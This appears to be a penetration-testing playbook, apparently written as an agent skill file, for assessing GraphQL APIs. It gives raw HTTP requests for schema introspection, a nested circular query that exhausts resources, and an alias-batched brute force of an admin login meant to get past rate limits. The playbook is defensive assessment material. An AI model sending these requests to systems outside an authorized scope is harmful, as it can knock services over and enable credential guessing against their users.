---
name: example-graphql-skill
description: Tactical methodology for GraphQL introspection, depth limits, and batching attacks
playbook: api-security
---

# GraphQL Security Assessment Playbook

## 1. Prerequisites & Input Contract
- Target URL in scope (`scope.yaml`).
- Discovered GraphQL endpoint (e.g. `/graphql`, `/api/graphql`).

## 2. Step-by-Step Attack Sequence

### Step 1: Introspection Query
Attempt to retrieve full schema:
```http
POST /graphql HTTP/1.1
Host: {{ target }}
Content-Type: application/json

{"query": "{ __schema { types { name fields { name } } } }"}
```

### Step 2: Query Depth / Nested Circular Attack
Test for resource exhaustion without query depth limits:
```http
POST /graphql HTTP/1.1
Host: {{ target }}
Content-Type: application/json

{"query": "query { user { posts { author { posts { author { id } } } } } }"}
```

### Step 3: Batching / Alias Brute Force
Test for rate limiting bypass using aliases:
```http
POST /graphql HTTP/1.1
Host: {{ target }}
Content-Type: application/json

{"query": "query { a: login(user:\"admin\", pass:\"123\") b: login(user:\"admin\", pass:\"456\") }"}
```

## 3. Evidence Collection
Document confirmed issues in `findings/graphql_report.md` with full reproduction steps.
